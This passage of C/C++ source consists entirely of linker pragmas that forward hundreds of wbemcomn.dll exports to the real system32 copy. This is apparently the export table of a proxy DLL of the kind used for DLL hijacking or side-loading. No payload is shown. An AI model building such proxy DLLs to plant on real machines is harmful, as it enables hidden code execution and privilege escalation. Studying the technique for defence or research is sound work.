#pragma comment (linker, "/export:?ComputePenalty@CMinMaxLimitControl@@IEAAJKKPEAKPEAH@Z=c:/windows/system32/wbemcomn.?ComputePenalty@CMinMaxLimitControl@@IEAAJKKPEAKPEAH@Z,@515")
#pragma comment (linker, "/export:?ConcatWithoutQuotes@CTextTemplate@@AEAAXAEAVWString2@@AEAPEAG@Z=c:/windows/system32/wbemcomn.?ConcatWithoutQuotes@CTextTemplate@@AEAAXAEAVWString2@@AEAPEAG@Z,@516")
#pragma comment (linker, "/export:?ContainsSid@CNtAcl@@QEAAHAEAVCNtSid@@AEAE@Z=c:/windows/system32/wbemcomn.?ContainsSid@CNtAcl@@QEAAHAEAVCNtSid@@AEAE@Z,@517")
#pragma comment (linker, "/export:?CopyBuffer@WString2@@AEAAXPEBG_K@Z=c:/windows/system32/wbemcomn.?CopyBuffer@WString2@@AEAAXPEBG_K@Z,@518")
#pragma comment (linker, "/export:?CopyData@CSmallArrayBlob@@IEAAXPEAV1@@Z=c:/windows/system32/wbemcomn.?CopyData@CSmallArrayBlob@@IEAAXPEAV1@@Z,@519")
#pragma comment (linker, "/export:?CopyDataFrom@CFlexArray@@QEAAHAEBV1@@Z=c:/windows/system32/wbemcomn.?CopyDataFrom@CFlexArray@@QEAAHAEBV1@@Z,@520")
#pragma comment (linker, "/export:?CopyFileToAutorecover@@YAJPEAG0H@Z=c:/windows/system32/wbemcomn.?CopyFileToAutorecover@@YAJPEAG0H@Z,@521")
#pragma comment (linker, "/export:?CopyTo@CBuffer@@UEAAJPEAUIStream@@T_ULARGE_INTEGER@@PEAT3@2@Z=c:/windows/system32/wbemcomn.?CopyTo@CBuffer@@UEAAJPEAUIStream@@T_ULARGE_INTEGER@@PEAT3@2@Z,@522")
#pragma comment (linker, "/export:?CopyTo@CNtSid@@QEAAHPEAX@Z=c:/windows/system32/wbemcomn.?CopyTo@CNtSid@@QEAAHPEAX@Z,@523")
#pragma comment (linker, "/export:?CountQuery@CWQLScanner@@QEAAHXZ=c:/windows/system32/wbemcomn.?CountQuery@CWQLScanner@@QEAAHXZ,@524")
#pragma comment (linker, "/export:?CreateBlob@CSmallArrayBlob@@SAPEAV1@H@Z=c:/windows/system32/wbemcomn.?CreateBlob@CSmallArrayBlob@@SAPEAV1@H@Z,@525")
#pragma comment (linker, "/export:?CreateInst@CWbemCallSecurity@@SAPEAVIWbemCallSecurity@@XZ=c:/windows/system32/wbemcomn.?CreateInst@CWbemCallSecurity@@SAPEAVIWbemCallSecurity@@XZ,@526")
#pragma comment (linker, "/export:?CreateNewThread@CExecQueue@@MEAAHXZ=c:/windows/system32/wbemcomn.?CreateNewThread@CExecQueue@@MEAAHXZ,@527")
#pragma comment (linker, "/export:?CriticalFailADAPTrace@@YAHPEBD@Z=c:/windows/system32/wbemcomn.?CriticalFailADAPTrace@@YAHPEBD@Z,@528")
#pragma comment (linker, "/export:?CurrentLine@CAbstractQl1Parser@@QEAAHXZ=c:/windows/system32/wbemcomn.?CurrentLine@CAbstractQl1Parser@@QEAAHXZ,@529")
#pragma comment (linker, "/export:?CurrentToken@CAbstractQl1Parser@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?CurrentToken@CAbstractQl1Parser@@QEAAPEAGXZ,@530")
#pragma comment (linker, "/export:?DateFormat10@CDateTimeParser@@IEAAHPEBG0H@Z=c:/windows/system32/wbemcomn.?DateFormat10@CDateTimeParser@@IEAAHPEBG0H@Z,@531")
#pragma comment (linker, "/export:?DateFormat11@CDateTimeParser@@IEAAHPEBG0H@Z=c:/windows/system32/wbemcomn.?DateFormat11@CDateTimeParser@@IEAAHPEBG0H@Z,@532")
#pragma comment (linker, "/export:?DateFormat12@CDateTimeParser@@IEAAHPEBG0H@Z=c:/windows/system32/wbemcomn.?DateFormat12@CDateTimeParser@@IEAAHPEBG0H@Z,@533")
#pragma comment (linker, "/export:?DateFormat13@CDateTimeParser@@IEAAHPEBG0H@Z=c:/windows/system32/wbemcomn.?DateFormat13@CDateTimeParser@@IEAAHPEBG0H@Z,@534")
#pragma comment (linker, "/export:?DateFormat14@CDateTimeParser@@IEAAHPEBG0H@Z=c:/windows/system32/wbemcomn.?DateFormat14@CDateTimeParser@@IEAAHPEBG0H@Z,@535")
#pragma comment (linker, "/export:?DateFormat15@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat15@CDateTimeParser@@IEAAHPEBGH@Z,@536")
#pragma comment (linker, "/export:?DateFormat1@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat1@CDateTimeParser@@IEAAHPEBGH@Z,@537")
#pragma comment (linker, "/export:?DateFormat2@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat2@CDateTimeParser@@IEAAHPEBGH@Z,@538")
#pragma comment (linker, "/export:?DateFormat3@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat3@CDateTimeParser@@IEAAHPEBGH@Z,@539")
#pragma comment (linker, "/export:?DateFormat4@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat4@CDateTimeParser@@IEAAHPEBGH@Z,@540")
#pragma comment (linker, "/export:?DateFormat5@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat5@CDateTimeParser@@IEAAHPEBGH@Z,@541")
#pragma comment (linker, "/export:?DateFormat6@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat6@CDateTimeParser@@IEAAHPEBGH@Z,@542")
#pragma comment (linker, "/export:?DateFormat7@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat7@CDateTimeParser@@IEAAHPEBGH@Z,@543")
#pragma comment (linker, "/export:?DateFormat8@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?DateFormat8@CDateTimeParser@@IEAAHPEBGH@Z,@544")
#pragma comment (linker, "/export:?DateFormat9@CDateTimeParser@@IEAAHPEBG0H@Z=c:/windows/system32/wbemcomn.?DateFormat9@CDateTimeParser@@IEAAHPEBG0H@Z,@545")
#pragma comment (linker, "/export:?DebugDump@CFlexArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?DebugDump@CFlexArray@@QEAAXXZ,@546")
#pragma comment (linker, "/export:?DebugTrace@@YAHDPEBDZZ=c:/windows/system32/wbemcomn.?DebugTrace@@YAHDPEBDZZ,@547")
#pragma comment (linker, "/export:?DecrementIndex@CFlexQueue@@IEAAXAEAH@Z=c:/windows/system32/wbemcomn.?DecrementIndex@CFlexQueue@@IEAAXAEAH@Z,@548")
#pragma comment (linker, "/export:?DeleteAce@CNtAcl@@QEAAHH@Z=c:/windows/system32/wbemcomn.?DeleteAce@CNtAcl@@QEAAHH@Z,@549")
#pragma comment (linker, "/export:?DeletePropertyName@CAbstractQl1Parser@@IEAAXXZ=c:/windows/system32/wbemcomn.?DeletePropertyName@CAbstractQl1Parser@@IEAAXXZ,@550")
#pragma comment (linker, "/export:?DeleteSacl@CNtSecurityDescriptor@@QEAAJXZ=c:/windows/system32/wbemcomn.?DeleteSacl@CNtSecurityDescriptor@@QEAAJXZ,@551")
#pragma comment (linker, "/export:?DeleteStr@CWStringArray@@QEAAHH@Z=c:/windows/system32/wbemcomn.?DeleteStr@CWStringArray@@QEAAHH@Z,@552")
#pragma comment (linker, "/export:?DeleteString@WString2@@AEAAX_N@Z=c:/windows/system32/wbemcomn.?DeleteString@WString2@@AEAAX_N@Z,@553")
#pragma comment (linker, "/export:?DeleteString@WString@@AEAAXPEAG@Z=c:/windows/system32/wbemcomn.?DeleteString@WString@@AEAAXPEAG@Z,@554")
#pragma comment (linker, "/export:?DeleteValue@Registry@@QEAAHPEBG@Z=c:/windows/system32/wbemcomn.?DeleteValue@Registry@@QEAAHPEBG@Z,@555")
#pragma comment (linker, "/export:?Dequeue@CFlexQueue@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?Dequeue@CFlexQueue@@QEAAPEAXXZ,@556")
#pragma comment (linker, "/export:?Dequeue@CInstructionQueue@@QEAAJAEAPEAVCTimerInstruction@@AEAVCWbemTime@@@Z=c:/windows/system32/wbemcomn.?Dequeue@CInstructionQueue@@QEAAJAEAPEAVCTimerInstruction@@AEAVCWbemTime@@@Z,@557")
#pragma comment (linker, "/export:?Deserialize@C9XAce@@UEAA_NPEAE@Z=c:/windows/system32/wbemcomn.?Deserialize@C9XAce@@UEAA_NPEAE@Z,@558")
#pragma comment (linker, "/export:?Deserialize@CNtAce@@UEAA_NPEAE@Z=c:/windows/system32/wbemcomn.?Deserialize@CNtAce@@UEAA_NPEAE@Z,@559")
#pragma comment (linker, "/export:?Difference@CWStringArray@@SAXAEAV1@00@Z=c:/windows/system32/wbemcomn.?Difference@CWStringArray@@SAXAEAV1@00@Z,@560")
#pragma comment (linker, "/export:?Disable@CTraceSessionControl@@QEAAKXZ=c:/windows/system32/wbemcomn.?Disable@CTraceSessionControl@@QEAAKXZ,@561")
#pragma comment (linker, "/export:?DoLike@CLike@@IEAA_NPEBG0G@Z=c:/windows/system32/wbemcomn.?DoLike@CLike@@IEAA_NPEBG0G@Z,@562")
#pragma comment (linker, "/export:?DoesNeedNewThread@CExecQueue@@MEAAHPEAVCExecRequest@@@Z=c:/windows/system32/wbemcomn.?DoesNeedNewThread@CExecQueue@@MEAAHPEAVCExecRequest@@@Z,@563")
#pragma comment (linker, "/export:?DoesVectorTypeMatchArrayType@CVarVector@@QEAAHXZ=c:/windows/system32/wbemcomn.?DoesVectorTypeMatchArrayType@CVarVector@@QEAAHXZ,@564")
#pragma comment (linker, "/export:?Dump@CWQLScanner@@QEAAXXZ=c:/windows/system32/wbemcomn.?Dump@CWQLScanner@@QEAAXXZ,@565")
#pragma comment (linker, "/export:?Dump@QL_LEVEL_1_RPN_EXPRESSION@@QEAAXPEBD@Z=c:/windows/system32/wbemcomn.?Dump@QL_LEVEL_1_RPN_EXPRESSION@@QEAAXPEBD@Z,@566")
#pragma comment (linker, "/export:?Dump@QL_LEVEL_1_TOKEN@@QEAAXPEAU_iobuf@@@Z=c:/windows/system32/wbemcomn.?Dump@QL_LEVEL_1_TOKEN@@QEAAXPEAU_iobuf@@@Z,@567")
#pragma comment (linker, "/export:?DumpClientOps@@YAXPEAVCClientOpsNode@@@Z=c:/windows/system32/wbemcomn.?DumpClientOps@@YAXPEAVCClientOpsNode@@@Z,@568")
#pragma comment (linker, "/export:?DumpError@CExecRequest@@UEAAXXZ=c:/windows/system32/wbemcomn.?DumpError@CExecRequest@@UEAAXXZ,@569")
#pragma comment (linker, "/export:?DumpText@CVar@@QEAAHPEAU_iobuf@@@Z=c:/windows/system32/wbemcomn.?DumpText@CVar@@QEAAHPEAU_iobuf@@@Z,@570")
#pragma comment (linker, "/export:?ElementSize@CSafeArray@@QEAAHXZ=c:/windows/system32/wbemcomn.?ElementSize@CSafeArray@@QEAAHXZ,@571")
#pragma comment (linker, "/export:?Empty@CFlexArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?Empty@CFlexArray@@QEAAXXZ,@572")
#pragma comment (linker, "/export:?Empty@CPropertyName@@QEAAXXZ=c:/windows/system32/wbemcomn.?Empty@CPropertyName@@QEAAXXZ,@573")
#pragma comment (linker, "/export:?Empty@CSafeArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?Empty@CSafeArray@@QEAAXXZ,@574")
#pragma comment (linker, "/export:?Empty@CVar@@QEAAXXZ=c:/windows/system32/wbemcomn.?Empty@CVar@@QEAAXXZ,@575")
#pragma comment (linker, "/export:?Empty@CVarVector@@QEAAXXZ=c:/windows/system32/wbemcomn.?Empty@CVarVector@@QEAAXXZ,@576")
#pragma comment (linker, "/export:?Empty@CWStringArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?Empty@CWStringArray@@QEAAXXZ,@577")
#pragma comment (linker, "/export:?Empty@WString2@@QEAAXXZ=c:/windows/system32/wbemcomn.?Empty@WString2@@QEAAXXZ,@578")
#pragma comment (linker, "/export:?Empty@WString@@QEAAXXZ=c:/windows/system32/wbemcomn.?Empty@WString@@QEAAXXZ,@579")
#pragma comment (linker, "/export:?Enable@CTraceSessionControl@@QEAAKXZ=c:/windows/system32/wbemcomn.?Enable@CTraceSessionControl@@QEAAKXZ,@580")
#pragma comment (linker, "/export:?EnableAllPrivileges@@YAJK@Z=c:/windows/system32/wbemcomn.?EnableAllPrivileges@@YAJK@Z,@581")
#pragma comment (linker, "/export:?EnablePrivilege@@YAHKJ@Z=c:/windows/system32/wbemcomn.?EnablePrivilege@@YAHKJ@Z,@582")
#pragma comment (linker, "/export:?EncryptedCall@CIdentitySecurity@@AEAA_NXZ=c:/windows/system32/wbemcomn.?EncryptedCall@CIdentitySecurity@@AEAA_NXZ,@583")
#pragma comment (linker, "/export:?Enqueue@CExecQueue@@UEAAJPEAVCExecRequest@@PEAPEAX@Z=c:/windows/system32/wbemcomn.?Enqueue@CExecQueue@@UEAAJPEAVCExecRequest@@PEAPEAX@Z,@584")
#pragma comment (linker, "/export:?Enqueue@CFlexQueue@@QEAA_NPEAX@Z=c:/windows/system32/wbemcomn.?Enqueue@CFlexQueue@@QEAA_NPEAX@Z,@585")
#pragma comment (linker, "/export:?Enqueue@CInstructionQueue@@QEAAJVCWbemTime@@PEAVCTimerInstruction@@@Z=c:/windows/system32/wbemcomn.?Enqueue@CInstructionQueue@@QEAAJVCWbemTime@@PEAVCTimerInstruction@@@Z,@586")
#pragma comment (linker, "/export:?EnqueueAndWait@CExecQueue@@QEAAJPEAVCExecRequest@@@Z=c:/windows/system32/wbemcomn.?EnqueueAndWait@CExecQueue@@QEAAJPEAVCExecRequest@@@Z,@587")
#pragma comment (linker, "/export:?EnqueueWithoutSleep@CExecQueue@@QEAAJPEAVCExecRequest@@PEAPEAX@Z=c:/windows/system32/wbemcomn.?EnqueueWithoutSleep@CExecQueue@@QEAAJPEAVCExecRequest@@PEAPEAX@Z,@588")
#pragma comment (linker, "/export:?EnsureAllocated@CPropertyName@@IEAAXJ@Z=c:/windows/system32/wbemcomn.?EnsureAllocated@CPropertyName@@IEAAXJ@Z,@589")
#pragma comment (linker, "/export:?EnsureExtent@CFlexArray@@QEAAHH@Z=c:/windows/system32/wbemcomn.?EnsureExtent@CFlexArray@@QEAAHH@Z,@590")
#pragma comment (linker, "/export:?EnsureExtent@CSmallArrayBlob@@IEAAPEAV1@H@Z=c:/windows/system32/wbemcomn.?EnsureExtent@CSmallArrayBlob@@IEAAPEAV1@H@Z,@591")
#pragma comment (linker, "/export:?EnsureMatchState@CLike@@AEAAX_K@Z=c:/windows/system32/wbemcomn.?EnsureMatchState@CLike@@AEAAX_K@Z,@592")
#pragma comment (linker, "/export:?EnsureRunning@CTimerGenerator@@AEAAXXZ=c:/windows/system32/wbemcomn.?EnsureRunning@CTimerGenerator@@AEAAXXZ,@593")
#pragma comment (linker, "/export:?EnsureSize@CBuffer@@AEAAXK@Z=c:/windows/system32/wbemcomn.?EnsureSize@CBuffer@@AEAAXK@Z,@594")
#pragma comment (linker, "/export:?Enter@CCheckedInCritSec@@QEAAXXZ=c:/windows/system32/wbemcomn.?Enter@CCheckedInCritSec@@QEAAXXZ,@595")
#pragma comment (linker, "/export:?Enter@CCritSec@@QEAAXXZ=c:/windows/system32/wbemcomn.?Enter@CCritSec@@QEAAXXZ,@596")
#pragma comment (linker, "/export:?Enter@CExecQueue@@QEAAXXZ=c:/windows/system32/wbemcomn.?Enter@CExecQueue@@QEAAXXZ,@597")
#pragma comment (linker, "/export:?Enter@CStaticCritSec@@QEAAXXZ=c:/windows/system32/wbemcomn.?Enter@CStaticCritSec@@QEAAXXZ,@598")
#pragma comment (linker, "/export:?Enter@CWbemCriticalSection@@QEAAHK@Z=c:/windows/system32/wbemcomn.?Enter@CWbemCriticalSection@@QEAAHK@Z,@599")
#pragma comment (linker, "/export:?Equal@WString2@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.?Equal@WString2@@QEBAHPEBG@Z,@600")
#pragma comment (linker, "/export:?Equal@WString@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.?Equal@WString@@QEBAHPEBG@Z,@601")
#pragma comment (linker, "/export:?EqualNoCase@WString2@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.?EqualNoCase@WString2@@QEBAHPEBG@Z,@602")
#pragma comment (linker, "/export:?EqualNoCase@WString@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.?EqualNoCase@WString@@QEBAHPEBG@Z,@603")
#pragma comment (linker, "/export:?ErrorTrace@@YAHDPEBDZZ=c:/windows/system32/wbemcomn.?ErrorTrace@@YAHDPEBDZZ,@604")
#pragma comment (linker, "/export:?EscapeQuotes@WString2@@QEBA?AV1@XZ=c:/windows/system32/wbemcomn.?EscapeQuotes@WString2@@QEBA?AV1@XZ,@605")
#pragma comment (linker, "/export:?EscapeQuotes@WString@@QEBA?AV1@XZ=c:/windows/system32/wbemcomn.?EscapeQuotes@WString@@QEBA?AV1@XZ,@606")
#pragma comment (linker, "/export:?Execute@CExecQueue@@MEAAHPEAVCThreadRecord@1@@Z=c:/windows/system32/wbemcomn.?Execute@CExecQueue@@MEAAHPEAVCThreadRecord@1@@Z,@607")
#pragma comment (linker, "/export:?ExpandEnvironmentStringsW@CWbemInstallObject@@SAKPEBGPEAGK@Z=c:/windows/system32/wbemcomn.?ExpandEnvironmentStringsW@CWbemInstallObject@@SAKPEBGPEAGK@Z,@608")
#pragma comment (linker, "/export:?ExpandVariableValue@CWbemInstallObject@@CAJPEBGPEAG_KPEA_K@Z=c:/windows/system32/wbemcomn.?ExpandVariableValue@CWbemInstallObject@@CAJPEBGPEAG_KPEA_K@Z,@609")
#pragma comment (linker, "/export:?ExtractMachineName@@YAPEAGPEAG@Z=c:/windows/system32/wbemcomn.?ExtractMachineName@@YAPEAGPEAG@Z,@610")
#pragma comment (linker, "/export:?ExtractNext@CWQLScanner@@AEAAPEAUWSLexToken@@H@Z=c:/windows/system32/wbemcomn.?ExtractNext@CWQLScanner@@AEAAPEAUWSLexToken@@H@Z,@611")
#pragma comment (linker, "/export:?ExtractSelectType@CWQLScanner@@AEAAHXZ=c:/windows/system32/wbemcomn.?ExtractSelectType@CWQLScanner@@AEAAHXZ,@612")
#pragma comment (linker, "/export:?ExtractToken@WString2@@QEAAHGAEAV1@@Z=c:/windows/system32/wbemcomn.?ExtractToken@WString2@@QEAAHGAEAV1@@Z,@613")
#pragma comment (linker, "/export:?ExtractToken@WString2@@QEAAHPEBGAEAV1@@Z=c:/windows/system32/wbemcomn.?ExtractToken@WString2@@QEAAHPEBGAEAV1@@Z,@614")
#pragma comment (linker, "/export:?ExtractToken@WString@@QEAAHGAEAV1@@Z=c:/windows/system32/wbemcomn.?ExtractToken@WString@@QEAAHGAEAV1@@Z,@615")
#pragma comment (linker, "/export:?ExtractToken@WString@@QEAAHPEBGAEAV1@@Z=c:/windows/system32/wbemcomn.?ExtractToken@WString@@QEAAHPEBGAEAV1@@Z,@616")
#pragma comment (linker, "/export:?Fatal@CSafeArray@@AEAAXPEBD@Z=c:/windows/system32/wbemcomn.?Fatal@CSafeArray@@AEAAXPEBD@Z,@617")
#pragma comment (linker, "/export:?FillCVarAt@CVarVector@@QEAAXHAEAVCVar@@@Z=c:/windows/system32/wbemcomn.?FillCVarAt@CVarVector@@QEAAXHAEAVCVar@@@Z,@618")
#pragma comment (linker, "/export:?FillDMTF@CDateTimeParser@@QEAAHPEAG_K@Z=c:/windows/system32/wbemcomn.?FillDMTF@CDateTimeParser@@QEAAHPEAG_K@Z,@619")
#pragma comment (linker, "/export:?FillVariant@CVar@@QEAAXPEAUtagVARIANT@@H@Z=c:/windows/system32/wbemcomn.?FillVariant@CVar@@QEAAXPEAUtagVARIANT@@H@Z,@620")
#pragma comment (linker, "/export:?FinalizeMatchState@CLike@@AEAAXXZ=c:/windows/system32/wbemcomn.?FinalizeMatchState@CLike@@AEAAXXZ,@621")
#pragma comment (linker, "/export:?FindStr@CWStringArray@@QEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?FindStr@CWStringArray@@QEAAHPEBGH@Z,@622")
#pragma comment (linker, "/export:?FlipOperator@CAbstractQl1Parser@@IEAAHH@Z=c:/windows/system32/wbemcomn.?FlipOperator@CAbstractQl1Parser@@IEAAHH@Z,@623")
#pragma comment (linker, "/export:?FlushRepository@CWbemInstallObject@@SAJXZ=c:/windows/system32/wbemcomn.?FlushRepository@CWbemInstallObject@@SAJXZ,@624")
#pragma comment (linker, "/export:?Free@CWin32DefaultArena@@UEAAHPEAX@Z=c:/windows/system32/wbemcomn.?Free@CWin32DefaultArena@@UEAAHPEAX@Z,@625")
#pragma comment (linker, "/export:?FreeMap@CWbemInstallObject@@SAXXZ=c:/windows/system32/wbemcomn.?FreeMap@CWbemInstallObject@@SAXXZ,@626")
#pragma comment (linker, "/export:?Get100nss@CWbemTime@@QEBA_JXZ=c:/windows/system32/wbemcomn.?Get100nss@CWbemTime@@QEBA_JXZ,@627")
#pragma comment (linker, "/export:?GetAbsoluteCopy@CNtSecurityDescriptor@@QEAAPEAUSNtAbsoluteSD@@XZ=c:/windows/system32/wbemcomn.?GetAbsoluteCopy@CNtSecurityDescriptor@@QEAAPEAUSNtAbsoluteSD@@XZ,@628")
#pragma comment (linker, "/export:?GetAccessMask@C9XAce@@UEAAKXZ=c:/windows/system32/wbemcomn.?GetAccessMask@C9XAce@@UEAAKXZ,@629")
#pragma comment (linker, "/export:?GetAccessMask@CNtAce@@UEAAKXZ=c:/windows/system32/wbemcomn.?GetAccessMask@CNtAce@@UEAAKXZ,@630")
#pragma comment (linker, "/export:?GetAccessToken@@YAJAEAPEAX@Z=c:/windows/system32/wbemcomn.?GetAccessToken@@YAJAEAPEAX@Z,@631")
#pragma comment (linker, "/export:?GetAce@CNtAcl@@QEAAHHAEAVCNtAce@@@Z=c:/windows/system32/wbemcomn.?GetAce@CNtAcl@@QEAAHHAEAVCNtAce@@@Z,@632")
#pragma comment (linker, "/export:?GetAce@CNtAcl@@QEAAPEAVCNtAce@@H@Z=c:/windows/system32/wbemcomn.?GetAce@CNtAcl@@QEAAPEAVCNtAce@@H@Z,@633")
#pragma comment (linker, "/export:?GetAclSizeInfo@CNtAcl@@QEAAHPEAK0@Z=c:/windows/system32/wbemcomn.?GetAclSizeInfo@CNtAcl@@QEAAHPEAK0@Z,@634")
#pragma comment (linker, "/export:?GetActiveImpersonation@CWbemCallSecurity@@UEAAJXZ=c:/windows/system32/wbemcomn.?GetActiveImpersonation@CWbemCallSecurity@@UEAAJXZ,@635")
#pragma comment (linker, "/export:?GetActualVarType@CSafeArray@@QEAAHPEAG@Z=c:/windows/system32/wbemcomn.?GetActualVarType@CSafeArray@@QEAAHPEAG@Z,@636")
#pragma comment (linker, "/export:?GetAreaFlags@CWMITraceSettings@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetAreaFlags@CWMITraceSettings@@QEAAKXZ,@637")
#pragma comment (linker, "/export:?GetArenaHeap@CWin32DefaultArena@@SAPEAXXZ=c:/windows/system32/wbemcomn.?GetArenaHeap@CWin32DefaultArena@@SAPEAXXZ,@638")
#pragma comment (linker, "/export:?GetArray@CSafeArray@@QEAAPEAUtagSAFEARRAY@@XZ=c:/windows/system32/wbemcomn.?GetArray@CSafeArray@@QEAAPEAUtagSAFEARRAY@@XZ,@639")
#pragma comment (linker, "/export:?GetArrayCopy@CSafeArray@@QEAAPEAUtagSAFEARRAY@@XZ=c:/windows/system32/wbemcomn.?GetArrayCopy@CSafeArray@@QEAAPEAUtagSAFEARRAY@@XZ,@640")
#pragma comment (linker, "/export:?GetArrayPtr@CFlexArray@@QEAAPEAPEAXXZ=c:/windows/system32/wbemcomn.?GetArrayPtr@CFlexArray@@QEAAPEAPEAXXZ,@641")
#pragma comment (linker, "/export:?GetArrayPtr@CFlexArray@@QEBAPEBQEAXXZ=c:/windows/system32/wbemcomn.?GetArrayPtr@CFlexArray@@QEBAPEBQEAXXZ,@642")
#pragma comment (linker, "/export:?GetArrayPtr@CSmallArrayBlob@@QEAAPEAPEAXXZ=c:/windows/system32/wbemcomn.?GetArrayPtr@CSmallArrayBlob@@QEAAPEAPEAXXZ,@643")
#pragma comment (linker, "/export:?GetArrayPtr@CSmallArrayBlob@@QEBAPEBQEAXXZ=c:/windows/system32/wbemcomn.?GetArrayPtr@CSmallArrayBlob@@QEBAPEBQEAXXZ,@644")
#pragma comment (linker, "/export:?GetArrayPtr@CWStringArray@@QEAAPEAPEBGXZ=c:/windows/system32/wbemcomn.?GetArrayPtr@CWStringArray@@QEAAPEAPEBGXZ,@645")
#pragma comment (linker, "/export:?GetAt@CFlexArray@@QEBAPEAXH@Z=c:/windows/system32/wbemcomn.?GetAt@CFlexArray@@QEBAPEAXH@Z,@646")
#pragma comment (linker, "/export:?GetAt@CSmallArrayBlob@@QEBAPEAXH@Z=c:/windows/system32/wbemcomn.?GetAt@CSmallArrayBlob@@QEBAPEAXH@Z,@647")
#pragma comment (linker, "/export:?GetAt@CVarVector@@QEAAAEAVCVar@@H@Z=c:/windows/system32/wbemcomn.?GetAt@CVarVector@@QEAAAEAVCVar@@H@Z,@648")
#pragma comment (linker, "/export:?GetAt@CWStringArray@@QEBAPEAGH@Z=c:/windows/system32/wbemcomn.?GetAt@CWStringArray@@QEBAPEAGH@Z,@649")
#pragma comment (linker, "/export:?GetAuthenticationId@CWbemCallSecurity@@UEAAKAEAU_LUID@@@Z=c:/windows/system32/wbemcomn.?GetAuthenticationId@CWbemCallSecurity@@UEAAKAEAU_LUID@@@Z,@650")
#pragma comment (linker, "/export:?GetAutoRecoverFolder@CWbemInstallObject@@SAPEBGXZ=c:/windows/system32/wbemcomn.?GetAutoRecoverFolder@CWbemInstallObject@@SAPEBGXZ,@651")
#pragma comment (linker, "/export:?GetBSTR@CVar@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?GetBSTR@CVar@@QEAAPEAGXZ,@652")
#pragma comment (linker, "/export:?GetBSTRAt@CSafeArray@@QEAAPEAGH@Z=c:/windows/system32/wbemcomn.?GetBSTRAt@CSafeArray@@QEAAPEAGH@Z,@653")
#pragma comment (linker, "/export:?GetBSTRAtThrow@CSafeArray@@QEAAPEAGH@Z=c:/windows/system32/wbemcomn.?GetBSTRAtThrow@CSafeArray@@QEAAPEAGH@Z,@654")
#pragma comment (linker, "/export:?GetBinary@Registry@@QEAAHPEBGPEAPEAEPEAK@Z=c:/windows/system32/wbemcomn.?GetBinary@Registry@@QEAAHPEBGPEAPEAEPEAK@Z,@655")
#pragma comment (linker, "/export:?GetBinaryPath@CWbemInstallObject@@SAPEBGXZ=c:/windows/system32/wbemcomn.?GetBinaryPath@CWbemInstallObject@@SAPEBGXZ,@656")
#pragma comment (linker, "/export:?GetBlob@CVar@@QEAAPEAUtagBLOB@@XZ=c:/windows/system32/wbemcomn.?GetBlob@CVar@@QEAAPEAUtagBLOB@@XZ,@657")
#pragma comment (linker, "/export:?GetBool@CVar@@QEAAFXZ=c:/windows/system32/wbemcomn.?GetBool@CVar@@QEAAFXZ,@658")
#pragma comment (linker, "/export:?GetBoolAt@CSafeArray@@QEAAFH@Z=c:/windows/system32/wbemcomn.?GetBoolAt@CSafeArray@@QEAAFH@Z,@659")
#pragma comment (linker, "/export:?GetByte@CVar@@QEAAEXZ=c:/windows/system32/wbemcomn.?GetByte@CVar@@QEAAEXZ,@660")
#pragma comment (linker, "/export:?GetByteAt@CSafeArray@@QEAAEH@Z=c:/windows/system32/wbemcomn.?GetByteAt@CSafeArray@@QEAAEH@Z,@661")
#pragma comment (linker, "/export:?GetCallerIdentity@CWbemCallSecurity@@QEAAPEBGXZ=c:/windows/system32/wbemcomn.?GetCallerIdentity@CWbemCallSecurity@@QEAAPEBGXZ,@662")
#pragma comment (linker, "/export:?GetChar@CVar@@QEAADXZ=c:/windows/system32/wbemcomn.?GetChar@CVar@@QEAADXZ,@663")
#pragma comment (linker, "/export:?GetChildren@CClientOpsNode@@QEAAPEAV1@XZ=c:/windows/system32/wbemcomn.?GetChildren@CClientOpsNode@@QEAAPEAV1@XZ,@664")
#pragma comment (linker, "/export:?GetClsId@CVar@@QEAAPEAU_GUID@@XZ=c:/windows/system32/wbemcomn.?GetClsId@CVar@@QEAAPEAU_GUID@@XZ,@665")
#pragma comment (linker, "/export:?GetCompressedFileInfo@CMRCICompression@@SAHPEBGAEAW4CompressionLevel@1@AEAKAEAU_FILETIME@@AEA_J@Z=c:/windows/system32/wbemcomn.?GetCompressedFileInfo@CMRCICompression@@SAHPEBGAEAW4CompressionLevel@1@AEAKAEAU_FILETIME@@AEA_J@Z,@666")
#pragma comment (linker, "/export:?GetCreationTime@CEventLogRecord@@QEAA?AVCWbemTime@@XZ=c:/windows/system32/wbemcomn.?GetCreationTime@CEventLogRecord@@QEAA?AVCWbemTime@@XZ,@667")
#pragma comment (linker, "/export:?GetCultures@CMUILocaleList@@QEAAPEBGXZ=c:/windows/system32/wbemcomn.?GetCultures@CMUILocaleList@@QEAAPEBGXZ,@668")
#pragma comment (linker, "/export:?GetDMTF@CWbemTime@@AEAAHHKPEAG@Z=c:/windows/system32/wbemcomn.?GetDMTF@CWbemTime@@AEAAHHKPEAG@Z,@669")
#pragma comment (linker, "/export:?GetDWORD@CVar@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetDWORD@CVar@@QEAAKXZ,@670")
#pragma comment (linker, "/export:?GetDWORD@Registry@@QEAAHPEBGPEAK@Z=c:/windows/system32/wbemcomn.?GetDWORD@Registry@@QEAAHPEBGPEAK@Z,@671")
